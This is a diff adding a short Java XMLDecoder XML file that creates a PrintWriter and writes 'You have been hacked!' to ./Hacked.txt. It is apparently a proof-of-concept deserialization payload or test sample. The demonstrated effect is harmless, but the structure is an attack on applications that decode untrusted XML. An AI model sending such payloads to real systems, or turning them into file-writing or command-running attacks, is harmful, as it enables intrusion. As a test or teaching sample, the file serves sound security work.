@@ -1,0 +1,10 @@
+<?xml version="1.0" encoding="UTF-8" ?>
+<java version="1.4.0" class="java.beans.XMLDecoder">
+    <object class="java.io.PrintWriter">
+        <string>./Hacked.txt</string>
+        <void method="println">
+            <string>You have been hacked!</string>
+        </void>
+        <void method="close"/>
+    </object>
+</java>
